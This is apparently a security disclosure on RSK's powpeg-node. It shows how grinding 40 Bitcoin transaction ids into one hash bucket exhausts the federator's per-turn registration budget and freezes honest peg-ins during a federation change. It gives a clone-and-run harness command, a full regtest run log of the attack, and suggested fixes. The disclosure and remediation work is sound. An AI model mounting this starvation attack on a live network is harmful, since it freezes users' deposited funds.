# Bridge-rejected peg-ins are retried every turn and consume the entire `registerBtcTransaction` budget

An ordinary user peg-in — confirmed on Bitcoin, paid to the active federation — is not
credited on RSK for the whole federation-change window. It is credited on its own once
the retiring federation is cleared. No funds are lost; the funds are frozen for the
duration of the window.

Everything below comes from running the real `powpeg-node` and the real `rskj` Bridge on
a real regtest chain. Every number is read from the chain with `eth_call`; nothing on the
measurement path is re-implemented.

---

## 1. The two halves that disagree

| | what it validates the transaction against |
|---|---|
| **federator** (`BtcToRskClient`) | the **one** federation it listens to |
| **Bridge** (`rskj`) | **all live federations** — active *and* retiring |

A transaction that pays 500 000 sat to the active federation and 2 000 sat to the
retiring federation satisfies the first and fails the second. The federator keeps it and
sends it; the Bridge rejects it as `INVALID_AMOUNT` / `NO_REFUND` and — since RSKIP551 —
does **not** mark it as processed. So it stays in the federator's pending set and is
re-sent on every single turn.

The pending set is a `ConcurrentHashMap` keyed by `wtxid`, walked in bucket order, with a
hard cap of `MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN = 40` **sends** per turn — counted per
entry sent, not per registration accepted. `Sha256Hash.hashCode()` is just the last four
bytes of the hash, so an attacker can grind 40 transaction ids into bucket 0. Those 40
entries are visited first, the budget is exhausted, and every other registration — user
peg-ins, the outputs of spent peg-outs that must be returned to the UTXO pool, and the
federation change's own funds-migration transaction — is never offered to the Bridge for
the rest of the window.

## 2. Source references (deployed code)

`powpeg-node` tag `VETIVER-9.0.4.0`, commit [`3dc1d16`](https://github.com/rsksmart/powpeg-node/tree/3dc1d165bde136c7375a4f872842e312cd3f4743) —
the release jar `federate-node-VETIVER-9.0.4.0-all.jar` embeds `co.rsk:rskj-core:9.0.4-VETIVER` (`build.gradle:220-224`).

**The federator sees one federation, the Bridge sees all of them**

* [`BtcToRskClient.java:555-560`](https://github.com/rsksmart/powpeg-node/blob/3dc1d165bde136c7375a4f872842e312cd3f4743/src/main/java/co/rsk/federate/BtcToRskClient.java#L555-L560) —
  `BridgeUtils.getFederationNoSpendWallet(context, federationToListen, false, null)`: the
  wallet used for validation is built from the single listened federation.
* [`PegUtils.java:119-142`](https://github.com/rsksmart/powpeg-node/blob/3dc1d165bde136c7375a4f872842e312cd3f4743/src/main/java/co/rsk/federate/PegUtils.java#L119-L142) —
  `isValidPegInTx` only checks `getWalletOutputs(federationWallet)`; the 2 000 sat output
  does not belong to that federation, so it is invisible here.
* [`BridgeSupport.java:359-366`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/java/co/rsk/peg/BridgeSupport.java#L359-L366) and
  [`BridgeSupport.java:499-500`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/java/co/rsk/peg/BridgeSupport.java#L499-L516) —
  `getNoSpendWalletForLiveFederations(false)` = `federationSupport.getLiveFederations()`.
* [`PegUtils.java:95`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/java/co/rsk/peg/PegUtils.java#L95) — same live-federation view on the classification path.

**One output below the minimum rejects the whole transaction** (`allMatch`, not `anyMatch`)

* [`PegUtils.java:67-85`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/java/co/rsk/peg/PegUtils.java#L67-L85) — `allUTXOsToFedAreAboveMinimumPeginValue`.
* [`PegUtils.java:211-213`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/java/co/rsk/peg/PegUtils.java#L211-L213) — returns `PeginProcessAction.NO_REFUND, INVALID_AMOUNT`.

**And the rejection is never marked as processed on the deployed release**

* [`BridgeSupport.java:544-586`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/java/co/rsk/peg/BridgeSupport.java#L544-L586) —
  `shouldMarkRejectedPeginAsProcessed()` is `RSKIP459 && !RSKIP551`.
* [`reference.conf:104`](https://github.com/rsksmart/rskj/blob/731b9d8aaa3d266f9fb90687a53c6e507db08ae6/rskj-core/src/main/resources/reference.conf#L104) —
  `rskip551 = vetiver900`: RSKIP551 is active in this release, so the method returns
  `false` and the entry is kept, not dropped.

**The budget, and why the ordering is attacker-controlled**

* [`BtcToRskClient.java:53`](https://github.com/rsksmart/powpeg-node/blob/3dc1d165bde136c7375a4f872842e312cd3f4743/src/main/java/co/rsk/federate/BtcToRskClient.java#L53) —
  `MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN = 40`.
* [`BtcToRskClient.java:581-671`](https://github.com/rsksmart/powpeg-node/blob/3dc1d165bde136c7375a4f872842e312cd3f4743/src/main/java/co/rsk/federate/BtcToRskClient.java#L581-L671) —
  the loop over `fileData.getTransactionProofs().keySet()` and the `break` at 40 **sent**.
* [`BtcToRskClient.java:733-760`](https://github.com/rsksmart/powpeg-node/blob/3dc1d165bde136c7375a4f872842e312cd3f4743/src/main/java/co/rsk/federate/BtcToRskClient.java#L733-L760) —
  `shouldSendTx`: it decides on the listened federation only.
* [`Sha256Hash.java:261-264`](https://github.com/rsksmart/bitcoinj-thin/blob/514b7d187ea0e9ab0c1456f107b916b8535d0ec4/src/main/java/co/rsk/bitcoinj/core/Sha256Hash.java#L261-L264) —
  `hashCode()` is the last four bytes, nothing else.

## 3. What the harness proves

`e2e/run.sh` builds `powpeg-node` at the release tag, runs **two** real powpeg nodes (node A
mining and holding one federator key, node B syncing and holding the other), performs a
**real federation change on chain**, including the RSKIP419 SVP handover, broadcasts 40 real
attack transactions plus one real victim peg-in, measures the Bridge four times inside the
window, then lets the window close and measures again.

The claim is checked twice, from opposite directions:

* **inside the window** — victim `processedHeight = -1`, balance `0 wei`, at four
  independent samples; the 40 attack transactions equally unprocessed, so they cannot have
  been credited and removed.
* **after the window** — the same transactions are credited: the victim receives
  10 000 000 000 000 000 000 wei for 1 000 000 sat, and the attacker's balance becomes
  110 000 000 000 000 000 wei = 22 × 500 000 sat, exactly the outputs that were worth
  nothing a minute earlier.

That second half is the control, and it is also what makes this *temporary* freezing and
not permanent freezing or loss of funds.

## 4. Running it

One command. It builds what it needs the first time (~20-25 min end to end on a laptop),
then takes about 10 minutes.

```bash
git clone https://github.com/kevin21121956-bot/heheheeheheh
cd heheheeheheh
./e2e/run.sh
```

Requirements:

* **JDK 17 x86_64** (Rosetta on Apple silicon — `leveldbjni` 1.8 ships no arm64 slice;
  `.metal`/native arm64 JDKs fail at wallet creation).
* `bitcoind` (v28+ works; a wallet is created by the script).
* `python3` (standard library only — no pip, no venv).
* ~5 GB free disk for the two fat jars and the regtest databases.

Output goes to `~/powpeg-e2e`:

```
state/state.json      txids, addresses, every measurement
logs/node-federator1  raw rsk.log of node A
logs/node-federator2  raw rsk.log of node B
logs/powpeg-*.log     JVM stdout
```

Useful flags: `--keep` (leave the stack running), `--work DIR`, `--from <stage>` to resume.
The verdict at the end is six checks and an `OVERALL` line; the exit code is non-zero if any
check fails.

`proof.sh` is a second, independent layer: it applies the patches in `patches/` and runs the
project's own test classes against the production sources, asserting the same six facts
(including the 40-slot budget against a real `ConcurrentHashMap`).

## 5. Full run

One complete run, verbatim, from a clean start. This is the evidence: node pids, the real
handover, the queue depth, the four in-window measurements and the recovery.

```text
== 0. preflight ==
  JVM: x86_64 JDK 17 under Rosetta (leveldbjni has no arm64 build)
  openjdk version "17.0.20.1" 2026-08-18
  bitcoind bitcoind
  python 3.14.8  (stdlib only, no pip)
  free disk   18 GB   (the two fat jars need ~4 GB)

== 1. build powpeg-node ==
  powpeg-node federate-node-VETIVER-9.0.4.0-all.jar

== 1b. clearing leftovers from previous runs ==
  killing stale FederateRunner: 44528
44565

== 2. bitcoind regtest ==
  bitcoind up on 18443/18444
  chain already at 722 blocks

== 3. two powpeg nodes (this jar IS the RSK node: FederateRunner embeds rskj) ==

== 3a. node A: miner + federator1 ==
  powpeg-node pid 46207 as 'federator1' (rpc 4444, p2p 50501, miner yes)

== 3b. node B: federator2, syncing from node A ==
  powpeg-node pid 46246 as 'federator2' (rpc 4445, p2p 50502, miner no)
  waiting for node B to sync from node A
  node A at 20, node B at 21

== 3c. both federators are actually running ==
[federator] checking that 'federator1' (0x85845342) is alive
             start: bridge BTC height 0, nonce 0
             alive: nonce 0 -> 1, bridge BTC height 0 -> 25
[federator] checking that 'federator2' (0x138161cd) is alive
             start: bridge BTC height 25, nonce 0
             alive: nonce 0 -> 1, bridge BTC height 25 -> 50

== 4. seed the genesis federation with real BTC ==
[peg] active federation 2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7
[peg] funded the funder mmnKsos16Vw5StjFJrXupKAPCJ8TVoZP8d with 0.05000000 BTC (a9e753605a933c25a2:1)
[peg] peg-in 06aa54558bbde6457f3b9e10e331bc32bb618479354b59fd33fa3292f5a6638c (3000000 sat) -> the genesis federation
[peg] Bridge BTC height 500 (bitcoind 728)
[peg] the Bridge registered the peg-in at RSK block 645; the federation now holds real BTC

== 5. real federation change, then the RSKIP419 SVP handover (2-of-3 votes) ==
[federation] waiting for the chain to produce a few blocks
             block 645
[federation] current federation
             size=3 address=2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7
[federation] authorizers: 0x5252403b 0x0d8c44bd 0x566bca18
             auth-a in wallet
             auth-b in wallet
             auth-c in wallet
[federation] createFederation
             auth-a voted (0xb9f8c0a5d6800f3e)
             auth-b voted (0xea97bb922da4cf73)
             auth-c voted (0x9c2d9c42e121f93e)
             pending federation exists, size 0
[federation] addFederatorPublicKeyMultikey x2
             auth-a voted (0xbf3f84a63f62c02e)
             auth-b voted (0x2199c9c0bd446b75)
             auth-c voted (0xf99d1f6ea4069736)
             0x85845342 added, pending federation size 1
             auth-a voted (0x39c25736cea142c8)
             auth-b voted (0xa7911b8ac242fdaf)
             auth-c voted (0x2bfa918f20fbeff3)
             0x138161cd added, pending federation size 2
[federation] pending federation hash 0xe7dbf557de89efc7adcf8d3669742f689bc6a9ee4259023fd12c8528c3695051
[federation] commitFederation
             auth-a voted (0xbf7735f5c7756875)
             auth-b voted (0x59e4b2ec46d686c7)
             auth-c voted (0x572b00a61f59fe97)
             committed; the new federation activates in 150 blocks
[federation] proposed federation set (size 2); driving the SVP cycle
             proposed federation pays to 2N72eUAoADNhqRnsp2szzuVfYSeDRQENuAt
             updateCollections dry run: federator1 (0x85845342) is allowed, the others are not members of the active federation
             Bitcoin height 728, SVP-aware classification from 350
             updateCollections 0x30816973a2 ok
             call #1 at block 788 (start of the SVP): the Bridge built 2 fund tx, asked to release 7bf3c4ebd8ccb4bb
             block 791: 115 of 118 SVP blocks left, proposed size 2, no fund tx yet, spend tx waiting for signatures, 1 Bridge calls
             updateCollections 0x9a5cc274ef ok
             call #2 at block 800 (periodic): the Bridge built 0 fund tx
             block 737: fund tx 7bf3c4ebd8ccb4bbe9aac1e202b7feafb64e0ae7fc442dbc613b84036d723957 on Bitcoin, 500000 sat to the proposed federation
             the Bridge built 7bf3c4ebd8ccb4bb, the same tx: the stored hash was simply gone by the time this tx was registered
             block 811: 95 of 118 SVP blocks left, proposed size 2, fund tx 7bf3c4ebd8ccb4bbe9aac1e202b7feafb64e0ae7fc442dbc613b84036d723957 (7 conf), spend tx waiting for signatures, 2 Bridge calls
             updateCollections 0x4558e71708 ok
             call #3 at block 812 (periodic): the Bridge built 0 fund tx
             updateCollections 0xa67004af35 ok
             call #4 at block 824 (periodic): the Bridge built 0 fund tx
             block 830: 76 of 118 SVP blocks left, proposed size 2, fund tx 7bf3c4ebd8ccb4bbe9aac1e202b7feafb64e0ae7fc442dbc613b84036d723957 (18 conf), spend tx waiting for signatures, 4 Bridge calls
             updateCollections 0x7614318f68 ok
             call #5 at block 836 (periodic): the Bridge built 0 fund tx
             the Bridge recognised the signed fund tx; asking it to build the spend tx
             updateCollections 0xb945a1f03a ok
             call #6 at block 847 (fund tx recognised): the Bridge built 0 fund tx, asked to release 0da8bf94f60ab6d6
             block 851: 55 of 118 SVP blocks left, proposed size 2, fund tx 7bf3c4ebd8ccb4bbe9aac1e202b7feafb64e0ae7fc442dbc613b84036d723957 (30 conf), spend tx waiting for signatures, 6 Bridge calls
             block 769: spend tx 0da8bf94f60ab6d63044f71982120c2f277f483f14f80a0af5707147a109b559 spends the fund tx
             updateCollections 0xbcabb464c9 ok
             call #7 at block 859 (periodic): the Bridge built 0 fund tx
             updateCollections 0xfef81da940 ok
             call #8 at block 871 (periodic): the Bridge built 0 fund tx
             block 871: 35 of 118 SVP blocks left, proposed size 2, fund tx 7bf3c4ebd8ccb4bbe9aac1e202b7feafb64e0ae7fc442dbc613b84036d723957 (44 conf), spend tx created, 8 Bridge calls
             updateCollections 0x25ff63a610 ok
             call #9 at block 883 (periodic): the Bridge built 0 fund tx
             handover at block 891
               fund  tx 7bf3c4ebd8ccb4bbe9aac1e202b7feafb64e0ae7fc442dbc613b84036d723957 (500000 sat to the proposed federation, 55 conf)
               spend tx 0da8bf94f60ab6d63044f71982120c2f277f483f14f80a0af5707147a109b559 (spends the fund tx)
               2026-10-21-02:52:45.0773 INFO [c.r.p.f.FederationSupportImpl] [miner client] [blockHash=6fa554b8d764cec4af67133624496e5142498d28016ffe4757113c7666a3bbe9, blockHeight=890]
               2026-10-21-02:52:46.0817 INFO [c.r.p.f.FederationSupportImpl] [miner client] [blockHash=c3c84446ffefc47dd1bde3751d68fc03b617e42ce3cb66730f4b079d92b98eb3, blockHeight=891]
[federation] Handover done: the new federation is stored and will become active in 150 blocks
[federation] waiting for the new federation to activate (150 blocks)
             block 891, active=2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7, retiring=<not yet>
             block 911, active=2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7, retiring=<not yet>
             block 930, active=2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7, retiring=<not yet>
[federation] ACTIVE   2N72eUAoADNhqRnsp2szzuVfYSeDRQENuAt (size 2)
[federation] RETIRING 2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7   <-- the old federation, still live
[federation] the window is open: the retiring federation stays live for
             150 blocks after activation, plus 150 more of migration

== 6. attack: 40 ground Bitcoin txs + 1 honest victim peg-in ==
[attack] the retiring federation window is open; the clock is running
[attack] active   2N72eUAoADNhqRnsp2szzuVfYSeDRQENuAt
[attack] retiring 2MvQSG61B4LtKLECeo1dRDeDWXgJfnr3fC7
[attack] active scriptPubKey   a9149730c9fc1b78be3f3e28...
[attack] retiring scriptPubKey a91422a65d9485781e6cdc0e...
[attack] funded attacker mqLmmNjWRdfyNFTFMVi4WcsQQZWLncXPxo with 0.80000000 BTC (e0177a667571d42b97:1)
[attack] fan-out tx dce56d07289f414bf4235f04af5e49c53a74acc3c137891cd590b2d8acedac54 -> 48 x 702000 sat
         10/40 broadcast (avg 57 attempts)
         20/40 broadcast (avg 208 attempts)
         30/40 broadcast (avg 14 attempts)
         40/40 broadcast (avg 80 attempts)
[attack] 40 attack txs broadcast, all ground into bin 0
[attack] victim peg-in 5699f891238a6b03434f02e9adf8e0e172631081c5aa4a0606fd4845ad91ee3c (1000000 sat) -> n1jT19v1EgDnv3fLMEgVqjF5SRXGURjAkF
[attack] federator queue depth: 42 (need 41)
[attack] the queue holds 42 txs for a per-turn quota of 40: every turn is spent on the flood before the victim is offered
[attack] 5 BTC blocks mined
[attack] waiting for the Bridge to catch up to BTC block 799
[attack] Bridge BTC height is now 799
[attack] the federator's pending list holds 43 txs (quota 40 per turn)
[attack] the two federators have sent 48 + 38 txs so far (federator1 0x85845342, federator2 0x138161cd); watching for the retry loop
[attack] block 968: federator nonce 102 (+16), victim still unprocessed
[attack] block 973: federator nonce 102 (+16), victim still unprocessed
[attack] block 977: federator nonce 102 (+16), victim still unprocessed
[attack] block 982: federator nonce 118 (+32), victim still unprocessed
[attack] block 987: federator nonce 118 (+32), victim still unprocessed
[attack] block 992: federator nonce 118 (+32), victim still unprocessed

== 7. measure while the window is open ==

  --- measurement (t0) ---
  RSK block                  992   retiring fed live: True
  federator nonce            118  (registerBtcTransaction txs sent)
  victim  balance            0 wei
  victim  processed height   -1  (-1 = never)
  attack  40 txs processed   0
  attack  40 txs unprocessed 40
  attacker balance           0 wei


  --- measurement (t1) ---
  RSK block                  1007   retiring fed live: True
  federator nonce            150  (registerBtcTransaction txs sent)
  victim  balance            0 wei
  victim  processed height   -1  (-1 = never)
  attack  40 txs processed   0
  attack  40 txs unprocessed 40
  attacker balance           0 wei


  --- measurement (t2) ---
  RSK block                  1022   retiring fed live: True
  federator nonce            166  (registerBtcTransaction txs sent)
  victim  balance            0 wei
  victim  processed height   -1  (-1 = never)
  attack  40 txs processed   0
  attack  40 txs unprocessed 40
  attacker balance           0 wei


  --- measurement (t3) ---
  RSK block                  1036   retiring fed live: True
  federator nonce            182  (registerBtcTransaction txs sent)
  victim  balance            0 wei
  victim  processed height   -1  (-1 = never)
  attack  40 txs processed   0
  attack  40 txs unprocessed 40
  attacker balance           0 wei


== 8. recovery: let the retiring federation expire ==
             updateCollections dry run: federator1 (0x85845342) is allowed, the others are not members of the active federation
[recover] active federation created at RSK block 788, age 248 blocks
          its funds may migrate once it is 300 blocks old (activation 150 + migration 150)
          52 blocks to go (~1 min at one block per second)
             updateCollections 0xddf833fbfa ok
             block 1036: retiring size 3, active federation age 251/300
             updateCollections 0x932e416778 ok
             updateCollections 0x5cb0ceddd4 ok
             updateCollections 0x96bf52de8d ok
             block 1063: retiring size 3, active federation age 276/300
             updateCollections 0x016e7d2071 ok
             updateCollections 0x9e44e667aa ok
             updateCollections 0xb6b51c1124 ok
             block 1088: retiring size 3, active federation age 301/300
             updateCollections 0xcb0d774eef ok
[recover] the retiring federation is gone at RSK block 1095
[recover] retiring federation is gone; the 40 flood txs and the victim's peg-in are now valid peg-ins
[recover] victim credited after 27s: 10000000000000000 wei

  --- measurement (after) ---
  RSK block                  1122   retiring fed live: False
  federator nonce            283  (registerBtcTransaction txs sent)
  victim  balance            10000000000000000 wei
  victim  processed height   1122  (-1 = never)
  attack  40 txs processed   22
  attack  40 txs unprocessed 18
  attacker balance           110000000000000000 wei

[recover] victim final balance 10000000000000000 wei
[recover] the 40 flood txs are valid peg-ins again: 22 processed, 18 pending
[recover] attacker principal back: 110000000000000000 wei

== 9. verdict ==
  PASS  sampled inside the federation-change window   retiring federation live, block 992
  PASS  victim peg-in frozen during the window   balance=0 wei
  PASS  victim tx never marked processed during the window   processedHeight=-1
  PASS  attack txs never marked processed (retry loop)   40/40 unprocessed
  PASS  victim credited after the window   balance=10000000000000000 wei
  PASS  attacker recovered the principal   balance=110000000000000000 wei

  OVERALL: PASS -- temporary freezing of funds, demonstrated end to end
  evidence: /Users/<user>/powpeg-e2e/state/state.json
  logs:     /Users/<user>/powpeg-e2e/logs/
```

The arithmetic worth checking by hand:

* victim: `1 000 000 sat` → `10000000000000000 wei = 0.01 RBTC` (1 sat = 10^10 wei).
* attacker: `22 × 500 000 sat = 11 000 000 sat` → `110000000000000000 wei = 0.11 RBTC`,
  and `0 wei` at all four in-window samples.

## 6. Scope

* **Precondition**: a retiring federation must be live, i.e. a federation change is in
  progress. That is a normal, periodically recurring protocol process, not something the
  attacker schedules — and the attacker cannot extend it; the Bridge clears the retiring
  federation by age.
* **Impact**: temporary freezing of funds. A user's confirmed Bitcoin deposit is not
  credited on RSK for the window, and is credited afterwards. No theft, no loss, no
  permanent freeze.
* **Not claimed**: block production is not delayed and no claim is made about gas
  consumption capabilities. (An earlier version of this report selected such an impact; it
  was wrong on this evidence and is withdrawn.)
* **Regtest numbers**: the retiring window in regtest is ~150 RSK blocks, not the
  ~10 585 of mainnet (`FederationRegTestConstants` vs `FederationMainNetConstants`), and
  this harness runs 2 federators rather than 9. The per-federator budget of 40 is a source
  constant and does not scale with federation size; the larger mainnet federation makes the
  starvation deeper, not shallower. The 3.7-day figure is an inference from the constants,
  not a measurement.
* **Attacker cost**: the 40 attack transactions park 20 000 000 sat in the active
  federation, which is returned as RBTC when the window closes (the last measurement shows
  it). The sunk cost is the dust and the Bitcoin fees.

## 7. Suggested fix

No consensus change is needed.

1. In `BtcToRskClient.shouldSendTx`
   ([`:733-760`](https://github.com/rsksmart/powpeg-node/blob/3dc1d165bde136c7375a4f872842e312cd3f4743/src/main/java/co/rsk/federate/BtcToRskClient.java#L733-L760)),
   validate against the same view the Bridge uses — all live federations, not only the
   listened wallet — so a transaction the Bridge is guaranteed to reject is dropped instead
   of retried forever.
2. Count the per-turn budget on accepted registrations, and add a per-entry cooldown so a
   single repeated entry cannot occupy all 40 slots.
3. Quarantine an entry after N consecutive rejections, keeping the processed-height/age
   removal as the normal exit.

Defence in depth, on the rskj side: revisit `shouldMarkRejectedPeginAsProcessed` so that a
rejected non-refundable peg-in whose rejection reason cannot change is marked as processed.
That is a network-wide decision and is not proposed here.

## 8. Repository layout

```
e2e/run.sh        the harness: build, two nodes, federation change, attack, measure, recover
e2e/e2e.py        all stages; standard library only
patches/          unit tests added to rskj and powpeg-node for the same six facts
proof.sh          applies the patches and runs those test classes
```
